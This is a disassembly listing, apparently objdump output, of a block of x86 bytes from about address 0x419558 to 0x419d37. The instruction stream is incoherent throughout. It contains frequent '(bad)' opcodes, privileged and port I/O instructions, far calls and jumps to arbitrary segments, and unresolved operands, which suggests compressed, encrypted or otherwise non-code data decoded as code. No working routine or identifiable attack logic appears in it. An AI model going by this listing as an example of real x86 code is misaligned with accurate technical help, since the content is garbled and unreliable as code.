  419558:	adc    eax,0xa8f64f60
  41955d:	pop    ds
  41955e:	sar    ebp,0x93
  419561:	mov    esp,0x1badfa28
  419566:	mov    ebx,0xa9e24ad2
  41956b:	retf   
  41956c:	hlt    
  41956d:	ds or  esp,edx
  419570:	dec    ebp
  419571:	stc    
  419572:	mov    cs,edi
  419574:	pop    es
  419575:	push   ebp
  419576:	mov    ch,0x2
  419578:	and    edx,ebp
  41957a:	mov    dl,0x8c
  41957c:	inc    edi
  41957d:	xor    eax,0x9267275
  419582:	sar    edx,0xea
  419585:	pop    edi
  419586:	call   0x3abe:0x51aa13f3
  41958d:	pop    ebp
  41958e:	and    al,0xd5
  419590:	inc    esi
  419591:	into   
  419592:	or     ch,BYTE PTR [ecx]
  419594:	pop    ecx
  419595:	mov    esi,0x969467a0
  41959a:	pop    edi
  41959b:	lahf   
  41959c:	adc    edi,edx
  41959e:	pop    esi
  41959f:	adc    BYTE PTR [eax+0x3a1e7feb],dl
  4195a5:	mov    si,0xd86a
  4195a9:	shr    BYTE PTR [edx-0x6d],1
  4195ac:	mov    bh,BYTE PTR [esi]
  4195ae:	mov    WORD PTR [edi+0x60],?
  4195b1:	cmp    BYTE PTR [ebx+0x446fc21c],ah
  4195b7:	sub    al,0x77
  4195b9:	lahf   
  4195ba:	dec    esi
  4195bb:	xchg   DWORD PTR [esp+eax*1],ecx
  4195be:	fdiv   st,st(1)
  4195c0:	push   0x49f0685e
  4195c5:	idiv   BYTE PTR [edx-0x6f]
  4195c8:	mov    ebx,DWORD PTR [edi+0x1c77db2f]
  4195ce:	std    
  4195cf:	scas   eax,DWORD PTR es:[edi]
  4195d0:	adc    eax,0xbd8accc2
  4195d5:	adc    eax,0x6f3d5b52
  4195da:	fcom   QWORD PTR [bx+di+0x18]
  4195de:	cmp    ecx,DWORD PTR [edi-0x64668e19]
  4195e4:	cmp    ebx,DWORD PTR [edi]
  4195e6:	aad    0x52
  4195e8:	pop    edx
  4195e9:	fdiv   QWORD PTR [eax+0x14]
  4195ec:	lea    edx,[eax]
  4195ee:	sub    eax,0x6334bb35
  4195f3:	mov    dl,0xc8
  4195f5:	sbb    al,0x9a
  4195f7:	in     eax,0xd5
  4195f9:	jmp    0x41966d
  4195fb:	and    cl,BYTE PTR [edi+0x295de254]
  419601:	les    esp,FWORD PTR [ebx+0x4d608e27]
  419607:	inc    ebp
  419608:	mov    eax,0xd3a7c6ea
  41960d:	add    edx,edi
  41960f:	xchg   BYTE PTR [esp+esi*1],al
  419612:	add    eax,edi
  419614:	ins    BYTE PTR es:[edi],dx
  419615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419616:	daa    
  419617:	mov    ss,WORD PTR [ebx-0x3e]
  41961a:	or     edx,eax
  41961c:	jl     0x4195fd
  41961e:	or     esi,DWORD PTR [ecx+0x79d9d440]
  419624:	xchg   edx,eax
  419625:	ja     0x419696
  419627:	mov    ah,0xd5
  419629:	push   edx
  41962a:	lods   eax,DWORD PTR ds:[esi]
  41962b:	xchg   DWORD PTR [ebx],eax
  41962d:	push   cs
  41962e:	ror    BYTE PTR [edx],0x42
  419631:	outs   dx,DWORD PTR cs:[esi]
  419633:	push   ecx
  419634:	int3   
  419635:	sbb    DWORD PTR [esi+0x62],ecx
  419638:	inc    ebx
  419639:	and    dh,BYTE PTR [ebp+0x11]
  41963c:	cmp    esp,DWORD PTR [ebx+0x6c9cf1c]
  419642:	out    dx,al
  419643:	fsubr  DWORD PTR ss:[ebp+ebp*8-0x3bc760d2]
  41964b:	(bad)  
  41964c:	sub    BYTE PTR [ebp-0x5827b127],0xc4
  419653:	mov    ecx,esp
  419655:	mov    dh,BYTE PTR [ebx+0x426e2f1]
  41965b:	mov    dl,0xdc
  41965d:	scas   al,BYTE PTR es:[edi]
  41965e:	or     dl,ch
  419660:	dec    ebx
  419661:	sbb    DWORD PTR [ecx],ebp
  419663:	pop    esi
  419664:	sbb    eax,0xe66cfd73
  419669:	push   es
  41966a:	adc    al,0x7d
  41966c:	jg     0x41960b
  41966e:	mov    dl,BYTE PTR [edi+0x6f]
  419671:	add    ebp,DWORD PTR [edx-0x74]
  419674:	fldenv [esi]
  419676:	es inc ecx
  419678:	xchg   ebx,eax
  419679:	lods   eax,DWORD PTR ds:[esi]
  41967a:	pop    ecx
  41967b:	pop    ebp
  41967c:	cmp    BYTE PTR [ebx-0x2ddd24ef],dh
  419682:	sbb    DWORD PTR [edi+0x1c054d7d],0x28
  419689:	and    ebp,DWORD PTR [esi]
  41968b:	std    
  41968c:	pop    ss
  41968d:	mov    edx,0x786a3eb
  419692:	or     bh,BYTE PTR [ebp-0x30]
  419695:	jo     0x4196b9
  419697:	cmp    DWORD PTR [eax],ebp
  419699:	adc    bh,BYTE PTR [edi+0x6c]
  41969c:	mov    BYTE PTR [ebx-0x2],0x8d
  4196a0:	dec    edi
  4196a1:	jnp    0x419635
  4196a3:	mov    ch,0x2d
  4196a5:	clc    
  4196a6:	fidiv  WORD PTR [esi+0x58]
  4196a9:	out    0x68,eax
  4196ab:	mov    esp,0x4077cb75
  4196b0:	xchg   BYTE PTR [edi],dl
  4196b2:	daa    
  4196b3:	add    al,0x60
  4196b5:	pop    ebx
  4196b6:	pop    ss
  4196b7:	xchg   edi,eax
  4196b8:	mov    ?,WORD PTR [ebx-0x42c63013]
  4196be:	pop    ebx
  4196bf:	test   BYTE PTR [eax+0x65],dh
  4196c2:	cs jb  0x4196ff
  4196c5:	ror    DWORD PTR ds:0x5902fd0d,0x67
  4196cc:	(bad)  
  4196cd:	cdq    
  4196ce:	pushf  
  4196cf:	xor    eax,0x2ceb78e
  4196d4:	inc    edx
  4196d5:	lea    esi,[esi-0xf]
  4196d8:	xchg   edi,eax
  4196d9:	or     eax,0x7b8b96c1
  4196de:	cmp    BYTE PTR [edx-0x43b3943b],ah
  4196e4:	push   esi
  4196e5:	retf   0xc5e4
  4196e8:	aam    0x99
  4196ea:	mov    DWORD PTR [esi],ecx
  4196ec:	fwait
  4196ed:	xchg   BYTE PTR [ecx],bl
  4196ef:	cwde   
  4196f0:	adc    DWORD PTR [edx],0x80b6bab9
  4196f6:	mov    eax,DWORD PTR [edi-0x4e40809f]
  4196fc:	jmp    0x191e49d6
  419701:	xchg   BYTE PTR [edx-0x2c],cl
  419704:	(bad)  [edx-0x12e0de8a]
  41970a:	nop
  41970b:	scas   eax,DWORD PTR es:[edi]
  41970c:	dec    ecx
  41970d:	xchg   edi,eax
  41970e:	test   BYTE PTR [ecx-0x7821a4b2],bl
  419714:	xor    bh,ch
  419716:	sub    eax,0x28a9ac33
  41971b:	not    BYTE PTR [eax+0x5551f7d3]
  419721:	xchg   esi,eax
  419722:	mov    ah,0x46
  419724:	inc    ebp
  419725:	(bad)  
  419726:	loop   0x4196ea
  419728:	adc    DWORD PTR [esi+ebp*1-0x75],eax
  41972c:	retf   
  41972d:	adc    ch,BYTE PTR [ebx]
  41972f:	sub    eax,edx
  419731:	or     edx,ebp
  419733:	lock xor BYTE PTR [eax+edx*2-0xc],cl
  419738:	pushf  
  419739:	ficomp WORD PTR [eax-0x15cbea53]
  41973f:	jle    0x419765
  419741:	jle    0x419770
  419743:	add    ebx,DWORD PTR [esi+0xd]
  419746:	dec    edx
  419747:	cmp    BYTE PTR [ecx],dl
  419749:	and    bh,cl
  41974b:	arpl   WORD PTR [edi+0x5f64a80f],cx
  419751:	pop    ss
  419752:	lahf   
  419753:	cmp    DWORD PTR [edi+ebp*4],0x69
  419757:	xchg   esp,eax
  419758:	jb     0x419749
  41975a:	pop    edi
  41975b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41975c:	jmp    eax
  41975e:	inc    edx
  41975f:	pop    edi
  419760:	fnstcw WORD PTR [eax+0x3c]
  419763:	fmul   QWORD PTR [esi-0x2d]
  419766:	pop    es
  419767:	cmc    
  419768:	imul   ebx,DWORD PTR [eax],0x2437013b
  41976e:	push   eax
  41976f:	push   esp
  419770:	dec    esp
  419771:	dec    edx
  419772:	pop    edi
  419773:	iret   
  419774:	out    dx,eax
  419775:	ret    0x793e
  419778:	or     DWORD PTR [eax],ebx
  41977a:	int3   
  41977b:	pop    ss
  41977c:	adc    esi,edx
  41977e:	mov    ecx,0x7c4f7004
  419783:	lock fstp DWORD PTR [ecx]
  419786:	mov    dl,0x8c
  419788:	or     al,0x3e
  41978a:	rcr    BYTE PTR [esi+eax*2+0xe],cl
  41978e:	std    
  41978f:	mov    DWORD PTR [edx],edi
  419791:	cmp    eax,0xee293529
  419796:	pop    esp
  419797:	or     dl,0x10
  41979a:	pop    ebp
  41979b:	rcr    BYTE PTR [edx-0x15],1
  41979e:	jle    0x4197a0
  4197a0:	les    esp,FWORD PTR [ebp+0x35]
  4197a3:	jbe    0x419792
  4197a5:	popa   
  4197a6:	mov    dl,BYTE PTR [esi+0x59ea914c]
  4197ac:	aaa    
  4197ad:	xchg   esp,eax
  4197ae:	call   0x6e8fec9c
  4197b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197b4:	mov    ebx,0x3c4480f8
  4197b9:	push   esp
  4197ba:	xor    BYTE PTR [esi+0x2a],0xfe
  4197be:	not    BYTE PTR [esi-0x1a]
  4197c1:	and    al,BYTE PTR [ebx-0x5d4a64f2]
  4197c7:	dec    edx
  4197c8:	sub    DWORD PTR [esi+0x2cf86f93],edi
  4197ce:	jmp    0x2ca9:0x2db82398
  4197d5:	xchg   BYTE PTR [ecx-0x41],dh
  4197d8:	push   ss
  4197d9:	aaa    
  4197da:	xchg   edi,eax
  4197db:	cli    
  4197dc:	sub    BYTE PTR [eax-0x25279dd0],ch
  4197e2:	pop    ds
  4197e3:	scas   al,BYTE PTR es:[edi]
  4197e4:	xor    DWORD PTR [eax+0x39],esi
  4197e7:	pop    edx
  4197e8:	fs jb  0x41977b
  4197eb:	fdiv   QWORD PTR [edx-0x6dc6640b]
  4197f1:	sub    al,0xe4
  4197f3:	mov    es,WORD PTR [eax]
  4197f5:	adc    al,0x53
  4197f7:	push   es
  4197f8:	pop    ss
  4197f9:	retf   
  4197fa:	xchg   BYTE PTR [ebx],al
  4197fc:	ins    BYTE PTR es:[edi],dx
  4197fd:	ror    DWORD PTR [esi+0x46a5076a],0xb6
  419804:	jp     0x41978d
  419806:	jae    0x419873
  419808:	rol    DWORD PTR [eax-0x6],0x90
  41980c:	aaa    
  41980d:	ins    DWORD PTR es:[edi],dx
  41980e:	rcr    BYTE PTR [eax],0xa6
  419811:	lahf   
  419812:	iret   
  419813:	aam    0x25
  419815:	test   eax,0xe72ceff5
  41981a:	xor    edi,ecx
  41981c:	push   cs
  41981d:	jns    0x4197e6
  41981f:	add    DWORD PTR [esi-0x15cf2bd],ecx
  419825:	mov    bh,0x5
  419827:	push   ds
  419828:	push   ss
  419829:	pop    ss
  41982a:	mov    esi,0x4b27ba1d
  41982f:	pop    esi
  419830:	nop
  419831:	push   eax
  419832:	push   eax
  419833:	outs   dx,BYTE PTR ds:[esi]
  419834:	test   BYTE PTR [edx],ch
  419836:	jmp    0xd41a:0xe4861ba7
  41983d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41983e:	shl    ebp,1
  419840:	out    0xed,al
  419842:	xor    ch,bh
  419844:	sub    ecx,DWORD PTR [ebx]
  419846:	gs and ecx,esp
  419849:	out    0xc6,al
  41984b:	jge    0x4197ef
  41984d:	lods   al,BYTE PTR ds:[esi]
  41984e:	call   0x7ac777f2
  419853:	loope  0x419811
  419855:	int3   
  419856:	pop    ds
  419857:	mov    dl,0xd0
  419859:	out    dx,al
  41985a:	jmp    0x8b73050b
  41985f:	(bad)  
  419861:	and    bh,BYTE PTR [ebx-0x5797addc]
  419867:	mov    edx,0x9be84410
  41986c:	cmp    BYTE PTR [edx-0x7e6756b2],ah
  419872:	not    BYTE PTR [ebp+0x29]
  419875:	sar    DWORD PTR [edx+0x517c312d],cl
  41987b:	std    
  41987c:	xor    eax,0xd95a511b
  419881:	sbb    DWORD PTR [esi-0x59],esp
  419884:	je     0x4198c2
  419886:	fucomp st(5)
  419888:	test   al,0x34
  41988a:	ins    DWORD PTR es:[edi],dx
  41988b:	sbb    ch,dh
  41988d:	mov    al,ds:0x883d1313
  419892:	xor    eax,0x60f6de17
  419897:	outs   dx,DWORD PTR ds:[esi]
  419898:	in     eax,0x48
  41989a:	imul   BYTE PTR [ebx+0x6eea39f3]
  4198a0:	sub    cl,0xd
  4198a3:	mov    dl,0xb9
  4198a5:	jmp    0xcf79fd3d
  4198aa:	pop    ds
  4198ab:	dec    ebp
  4198ac:	jno    0x4198af
  4198ae:	mov    esp,0xf524787c
  4198b3:	arpl   WORD PTR [eax-0xf],dx
  4198b6:	test   al,0x43
  4198b8:	and    BYTE PTR [esi+0x4e],al
  4198bb:	rcl    DWORD PTR [edi-0x2b],1
  4198be:	or     cl,ch
  4198c0:	mov    esp,0x1d91de9d
  4198c5:	(bad)  
  4198c6:	xchg   edi,eax
  4198c7:	ret    
  4198c8:	in     al,0xf
  4198ca:	pop    ds
  4198cb:	loop   0x419923
  4198cd:	add    ebx,DWORD PTR [edi]
  4198cf:	retf   
  4198d0:	push   esp
  4198d1:	xor    DWORD PTR [edi],esp
  4198d3:	iret   
  4198d4:	bound  esp,QWORD PTR ds:0x687225b
  4198da:	jle    0x41986e
  4198dc:	jb     0x419910
  4198de:	mov    ?,ebp
  4198e0:	les    edx,FWORD PTR [ebp+0x1e]
  4198e3:	dec    edx
  4198e4:	loopne 0x4198f8
  4198e6:	imul   ebx,DWORD PTR [ebx+0x63e17ae],0xffffffb1
  4198ed:	cmp    ebx,edi
  4198ef:	jmp    0x41991e
  4198f1:	rcl    BYTE PTR [ebp+0x4a],0xe9
  4198f5:	out    dx,eax
  4198f6:	sub    DWORD PTR [eax+0xbfdb629],ebp
  4198fc:	nop
  4198fd:	je     0x4198f1
  4198ff:	in     al,0x1b
  419901:	dec    edi
  419902:	dec    ebp
  419903:	imul   edi,DWORD PTR [ebx+0x2c8cc16e],0x4c182587
  41990d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41990e:	aad    0x24
  419910:	sbb    eax,0x46c62a22
  419915:	js     0x41991a
  419917:	mov    dl,BYTE PTR [ebx*8+0x21fe9a1a]
  41991e:	aas    
  41991f:	dec    ebp
  419920:	(bad)  
  419921:	xor    bl,BYTE PTR [esi]
  419923:	jge    0x419948
  419925:	aaa    
  419926:	add    bl,ch
  419928:	jb     0x4198dd
  41992a:	xchg   edi,eax
  41992b:	xchg   edi,eax
  41992c:	test   eax,0x7b98f8f9
  419931:	dec    ecx
  419932:	mov    dh,0x15
  419934:	pushf  
  419935:	clc    
  419936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419937:	add    eax,ecx
  419939:	icebp  
  41993a:	mov    eax,ds:0xc49b82b2
  41993f:	add    bl,BYTE PTR [edi-0x5]
  419942:	fisttp DWORD PTR [eax+ebx*4]
  419945:	adc    ebp,esp
  419947:	jg     0x41990e
  419949:	mov    ecx,0x2fcfa9b9
  41994e:	inc    edi
  41994f:	cli    
  419950:	add    BYTE PTR [edi+0x3ad42193],ch
  419956:	mov    BYTE PTR [edi+0x77435637],cl
  41995c:	adc    BYTE PTR [ebx+0x59f2e6b],al
  419962:	fcmove st,st(1)
  419964:	out    0xf5,al
  419966:	cmp    al,0xa0
  419968:	push   ebp
  419969:	test   eax,0x6da19c95
  41996e:	mov    ah,0x50
  419970:	jle    0x419917
  419972:	dec    edx
  419973:	in     al,0xae
  419975:	dec    ebp
  419976:	ss retf 0x2372
  41997a:	pop    ds
  41997b:	push   ebp
  41997c:	xor    al,ah
  41997e:	jp     0x419938
  419980:	push   0x205b5b8a
  419985:	rcl    DWORD PTR [ebx-0x6fa4793b],0x32
  41998c:	fisttp DWORD PTR [eax+ebp*1+0x63e3ed1d]
  419993:	stc    
  419994:	popa   
  419995:	test   al,al
  419997:	add    bh,ch
  419999:	(bad)  
  41999a:	(bad)  
  41999b:	sti    
  41999c:	inc    esi
  41999d:	or     dh,0x2e
  4199a0:	pop    ebx
  4199a1:	push   eax
  4199a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199a3:	gs dec ebx
  4199a5:	div    BYTE PTR [esi-0x7e721626]
  4199ab:	call   0x133c34a
  4199b0:	mov    WORD PTR [edi],es
  4199b2:	aam    0x49
  4199b4:	fsubr  QWORD PTR [edi-0x67]
  4199b7:	enter  0xff49,0xbc
  4199bb:	pop    esi
  4199bc:	xchg   ecx,eax
  4199bd:	repnz in eax,0x54
  4199c0:	cmp    al,0x9c
  4199c2:	popa   
  4199c3:	addr16 xchg ebp,eax
  4199c5:	aas    
  4199c6:	or     al,0x3d
  4199c8:	(bad)  ds:0x61b7cc64
  4199ce:	out    0xe4,eax
  4199d0:	rcl    edx,0x98
  4199d3:	mov    ebp,0x9b369b76
  4199d8:	(bad)  
  4199d9:	mul    BYTE PTR [ebp+0x34]
  4199dc:	aam    0xd5
  4199de:	call   0xa5c1:0xf4121166
  4199e5:	mov    ebp,DWORD PTR [eax]
  4199e7:	push   edx
  4199e8:	ficomp DWORD PTR [eax+0x4a]
  4199eb:	and    DWORD PTR [ebx-0x25],0xf0070330
  4199f2:	ja     0x419a59
  4199f4:	xlat   BYTE PTR ds:[ebx]
  4199f5:	fwait
  4199f6:	test   DWORD PTR [ebx-0x2518331f],0x4c32fa3a
  419a00:	pop    es
  419a01:	mov    cl,0x1c
  419a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a04:	jmp    0x419a1a
  419a06:	or     ebp,0xbf7afa77
  419a0c:	mov    ss:0x9ed8f2c6,al
  419a12:	cmc    
  419a13:	mov    eax,ds:0x4dc5a305
  419a18:	sub    bh,ah
  419a1a:	mov    esp,0xfffcaa55
  419a1f:	dec    esp
  419a20:	xchg   esp,eax
  419a21:	sbb    al,0x7
  419a23:	dec    esi
  419a24:	or     ah,BYTE PTR [ecx]
  419a26:	sbb    dh,BYTE PTR [eax+0x18]
  419a29:	sub    eax,0xadf1313d
  419a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a2f:	or     bh,BYTE PTR [ebp+0x74]
  419a32:	in     eax,dx
  419a33:	neg    BYTE PTR [ebx]
  419a35:	gs pop edx
  419a37:	(bad)  
  419a38:	sub    ebp,edx
  419a3a:	sbb    ch,bl
  419a3c:	pminub mm2,QWORD PTR [ecx-0x6b834977]
  419a43:	jmp    0x419a70
  419a45:	sahf   
  419a46:	scas   eax,DWORD PTR es:[edi]
  419a47:	mov    cl,0xa1
  419a49:	dec    edx
  419a4a:	xchg   esp,eax
  419a4b:	sub    BYTE PTR [esi-0x7d309216],ah
  419a51:	pop    esi
  419a52:	push   0x9005d4cf
  419a57:	xchg   ecx,eax
  419a58:	mov    ecx,0x5b0b0077
  419a5d:	out    0x71,al
  419a5f:	xor    esp,DWORD PTR [ebx-0x6d]
  419a62:	(bad)  
  419a63:	and    bl,BYTE PTR cs:[ecx-0xd]
  419a67:	mov    ebx,0xa751793b
  419a6c:	push   ebp
  419a6d:	iret   
  419a6e:	out    dx,eax
  419a6f:	mov    ah,BYTE PTR [ebp+0x7a6d5005]
  419a75:	cs popa 
  419a77:	xlat   BYTE PTR ds:[ebx]
  419a78:	sub    eax,0xeb473a8e
  419a7d:	inc    esi
  419a7e:	frstor [edi]
  419a80:	sub    al,0x59
  419a82:	xor    cl,BYTE PTR [eax+0x78]
  419a85:	fwait
  419a86:	test   BYTE PTR [esi-0x50],cl
  419a89:	lods   al,BYTE PTR ds:[esi]
  419a8a:	rcr    BYTE PTR [edi+0x3a],1
  419a8d:	(bad)
  419a90:	out    dx,eax
  419a91:	sub    esi,DWORD PTR ds:0xfc70d4c7
  419a97:	pop    ebx
  419a98:	add    al,0x40
  419a9a:	xchg   edi,eax
  419a9c:	cmp    al,0x1f
  419a9e:	fld    QWORD PTR [edx]
  419aa0:	dec    edx
  419aa1:	jnp    0x419a5f
  419aa3:	and    edx,DWORD PTR [eax-0x53]
  419aa6:	out    dx,eax
  419aa7:	ins    DWORD PTR es:[edi],dx
  419aa8:	mov    eax,ds:0x16a6f438
  419aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aae:	xchg   edx,eax
  419aaf:	push   ecx
  419ab0:	or     esp,DWORD PTR [ecx]
  419ab2:	add    dl,BYTE PTR [eax-0x5eca064]
  419ab8:	push   0xffffff98
  419aba:	(bad)  
  419abb:	push   edx
  419abc:	push   esp
  419abd:	sbb    BYTE PTR [ebp+0x25],al
  419ac0:	mov    ch,0xd8
  419ac2:	(bad)  
  419ac3:	call   0x17f4:0xbf630d5d
  419aca:	repz not BYTE PTR [ebp-0x67]
  419ace:	inc    esi
  419acf:	sub    BYTE PTR [ebp-0x49f27ad3],cl
  419ad5:	call   0x1d24:0x3a097931
  419adc:	in     al,0xce
  419ade:	sub    edi,DWORD PTR [ebx+ebp*1-0x718dcb8]
  419ae5:	rcr    BYTE PTR ds:0x2aa4680d,0xed
  419aec:	jno    0x419abe
  419aee:	int    0x7
  419af0:	or     DWORD PTR [esi+ebx*8],0x4a465b63
  419af7:	lock xor edx,DWORD PTR [ebx-0x7d857631]
  419afe:	loopne 0x419b02
  419b00:	jo     0x419b38
  419b02:	das    
  419b03:	jmp    0xd121:0x9296f136
  419b0a:	ret    
  419b0b:	and    ah,BYTE PTR [edx+0x47]
  419b0e:	jbe    0x419aa2
  419b10:	inc    eax
  419b11:	pop    es
  419b12:	adc    eax,0xd005a539
  419b17:	xchg   esp,eax
  419b18:	fisubr DWORD PTR [edx-0x4b]
  419b1b:	mov    ds:0x68dfbdbf,al
  419b20:	sub    ah,BYTE PTR [eax]
  419b22:	ret    0xa818
  419b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b26:	gs aaa 
  419b28:	pop    ss
  419b29:	(bad)  
  419b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b2b:	pop    esi
  419b2c:	js     0x419b14
  419b2e:	xchg   ebp,eax
  419b2f:	push   esi
  419b30:	xchg   edx,eax
  419b31:	mov    BYTE PTR [eax+0x792b6fff],dl
  419b37:	push   ebp
  419b38:	loop   0x419b29
  419b3a:	dec    BYTE PTR [ebp+edx*2-0x716e51eb]
  419b41:	dec    eax
  419b42:	aaa    
  419b43:	mov    bh,0xd4
  419b45:	(bad)  
  419b47:	jp     0x419bae
  419b49:	mov    ds,WORD PTR [ebp-0x6fceb5f]
  419b4f:	je     0x419bb6
  419b51:	rcl    bl,1
  419b53:	jg     0x419b16
  419b55:	add    edi,DWORD PTR [edx+edx*8]
  419b58:	test   BYTE PTR [ebp+0x56e321e6],bh
  419b5e:	xchg   ecx,eax
  419b5f:	jle    0x419b44
  419b61:	cmp    DWORD PTR [edx+0x2d3613b1],ecx
  419b67:	add    ah,dl
  419b69:	push   0x313252c0
  419b6e:	sahf   
  419b6f:	retf   
  419b70:	aas    
  419b71:	and    DWORD PTR [ecx+0x57c7b9b2],0x4fa1b7a0
  419b7b:	adc    al,0xc4
  419b7d:	fwait
  419b7e:	sub    al,0xf3
  419b80:	arpl   bx,bp
  419b82:	xlat   BYTE PTR ds:[ebx]
  419b83:	icebp  
  419b84:	frstor [edx-0x77]
  419b87:	and    cl,BYTE PTR [ebp+0x6f]
  419b8a:	jne    0x419be3
  419b8c:	loop   0x419b4e
  419b8e:	sbb    DWORD PTR [edi+ebp*8+0x28],0xffffffc4
  419b93:	stos   DWORD PTR es:[edi],eax
  419b94:	push   esp
  419b95:	js     0x419b32
  419b97:	dec    ecx
  419b98:	(bad)
  419b9c:	test   al,0x8e
  419b9e:	add    DWORD PTR ds:0x65feb122,eax
  419ba4:	les    ecx,FWORD PTR [edx+eax*4]
  419ba7:	(bad)  
  419ba8:	push   cs
  419ba9:	xchg   BYTE PTR [edx],cl
  419bab:	repnz test DWORD PTR [ebx+edi*2],ebp
  419baf:	fwait
  419bb0:	test   eax,0xb0325e86
  419bb5:	sbb    ebx,edi
  419bb7:	push   0x18
  419bb9:	dec    eax
  419bba:	out    dx,al
  419bbb:	stos   DWORD PTR es:[edi],eax
  419bbc:	push   eax
  419bbd:	mov    dl,0x44
  419bbf:	xor    al,0x58
  419bc1:	mov    esi,0xbb0cc021
  419bc6:	add    edx,esp
  419bc8:	mov    al,ds:0x1138703
  419bcd:	adc    DWORD PTR [ecx-0x57995e5b],esp
  419bd3:	pop    edi
  419bd4:	mov    ah,0xdc
  419bd6:	test   al,0x92
  419bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd9:	inc    esp
  419bda:	mov    al,ds:0x68b4e5ca
  419bdf:	inc    edx
  419be0:	in     eax,0x35
  419be2:	clc    
  419be3:	push   0xe3e6a1ba
  419be8:	mov    BYTE PTR [ecx+0xc],dh
  419beb:	mov    bh,0xd6
  419bed:	mov    al,0xbf
  419bef:	fild   DWORD PTR [ecx]
  419bf1:	or     DWORD PTR [edx],ebx
  419bf3:	inc    ecx
  419bf4:	jo     0xb8bf02b2
  419bfa:	or     bh,ah
  419bfc:	popf   
  419bfd:	pusha  
  419bfe:	stos   DWORD PTR es:[edi],eax
  419bff:	lods   eax,DWORD PTR ds:[esi]
  419c00:	sbb    BYTE PTR [edi],dh
  419c02:	sahf   
  419c03:	sbb    edi,DWORD PTR [edi]
  419c05:	cmp    eax,0xcb379cbb
  419c0a:	fstp   TBYTE PTR [edi+0x338b9bd5]
  419c10:	mov    ?,WORD PTR [eax-0x79]
  419c13:	fwait
  419c14:	pop    esp
  419c15:	inc    ecx
  419c16:	clc    
  419c17:	xchg   edi,eax
  419c18:	push   cs
  419c19:	in     eax,dx
  419c1a:	xchg   ebx,eax
  419c1b:	cli    
  419c1c:	add    BYTE PTR [edi],ch
  419c1e:	jecxz  0x419c86
  419c20:	mov    ah,0x5e
  419c22:	dec    ebp
  419c23:	out    dx,al
  419c24:	xor    eax,0x635a90e9
  419c29:	xor    DWORD PTR [ebp-0x7],0xa2a0bbd9
  419c30:	test   DWORD PTR ds:0x989a3167,ebp
  419c36:	xor    ebx,DWORD PTR [eax-0x6d44de1b]
  419c3c:	enter  0xd67a,0xa1
  419c40:	or     DWORD PTR [edi-0x55b1c42],esp
  419c46:	pop    edi
  419c47:	test   eax,0xbd085311
  419c4c:	outs   dx,DWORD PTR ds:[esi]
  419c4d:	mov    ch,BYTE PTR [edx+0x30aef84f]
  419c53:	ss das 
  419c55:	add    ebp,DWORD PTR [ecx-0x31]
  419c58:	lods   al,BYTE PTR ds:[esi]
  419c59:	dec    edi
  419c5a:	push   ebx
  419c5b:	mov    esp,?
  419c5d:	jle    0x419c66
  419c5f:	retf   
  419c60:	mov    ecx,0x9191cbbc
  419c65:	sub    DWORD PTR [ebp+0x6c],0x26
  419c69:	hlt    
  419c6a:	rcl    edi,0xe0
  419c6d:	mov    al,ds:0x9c070b63
  419c72:	xor    eax,0x3de97b67
  419c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c78:	and    DWORD PTR [ebp+0x446f4f2],0xffffffea
  419c7f:	mov    ah,0x4a
  419c81:	mov    cl,0x24
  419c83:	mov    edx,0x273cdd74
  419c88:	and    BYTE PTR [ebx+0x2e0263bd],ch
  419c8e:	or     eax,0x4a483b46
  419c93:	pop    esp
  419c94:	mov    ebx,0x6ec51375
  419c99:	js     0x419c36
  419c9b:	jnp    0x419cb5
  419c9d:	sbb    DWORD PTR [esi],0x6
  419ca0:	stc    
  419ca1:	call   0x9608887
  419ca6:	scas   al,BYTE PTR es:[edi]
  419ca7:	mov    dh,0xa
  419ca9:	pop    esp
  419caa:	and    cl,BYTE PTR [si-0x71f6]
  419caf:	fs mov dh,0xa7
  419cb2:	xor    eax,0x7684f533
  419cb7:	stos   BYTE PTR es:[edi],al
  419cb8:	jnp    0x419cde
  419cba:	sub    ebp,DWORD PTR [ebx]
  419cbc:	test   eax,0xf13d854c
  419cc1:	es pop edx
  419cc3:	mov    esp,0x42b7333e
  419cc8:	(bad)  
  419cc9:	mov    bl,0x87
  419ccb:	fld    QWORD PTR [esi+0x17]
  419cce:	les    edx,FWORD PTR [ebx-0x28]
  419cd1:	in     al,0x3f
  419cd3:	add    bh,BYTE PTR [edx-0x4ae6d961]
  419cd9:	push   ebx
  419cda:	call   0x4e15:0x5356751c
  419ce1:	and    eax,0xee64ee7d
  419ce6:	in     al,0x45
  419ce8:	jno    0x419d1d
  419cea:	adc    ebx,DWORD PTR [edi+eiz*8]
  419ced:	nop
  419cee:	inc    esp
  419cef:	jb     0x419c74
  419cf1:	(bad)  
  419cf2:	cmp    ebx,DWORD PTR [ebx+ecx*1]
  419cf5:	call   0x649d:0x7e3c648
  419cfc:	push   esp
  419cfd:	xor    al,0x60
  419cff:	dec    edi
  419d00:	pop    DWORD PTR [ecx]
  419d02:	xchg   ebp,eax
  419d03:	and    DWORD PTR [esi-0x75],eax
  419d06:	into   
  419d07:	push   0x52ada45e
  419d0c:	mov    esp,0x11dea31a
  419d11:	in     eax,dx
  419d12:	mov    bh,0x5e
  419d14:	out    0xac,eax
  419d16:	sbb    edi,DWORD PTR [ebx-0x3f6184fe]
  419d1c:	mov    dl,0xd
  419d1e:	fisub  DWORD PTR [ebx+edx*8-0x21]
  419d22:	es mov ebp,0x51b3c97f
  419d28:	xchg   edi,eax
  419d29:	sti    
  419d2a:	clc    
  419d2b:	scas   eax,DWORD PTR es:[edi]
  419d2c:	and    bl,BYTE PTR [edi]
  419d2e:	fsubr  st,st(2)
  419d30:	and    dl,BYTE PTR [ebx+esi*1-0x45]
  419d34:	into   
  419d35:	jle    0x419cd4
  419d37:	mov    ebp,0x80f330c5
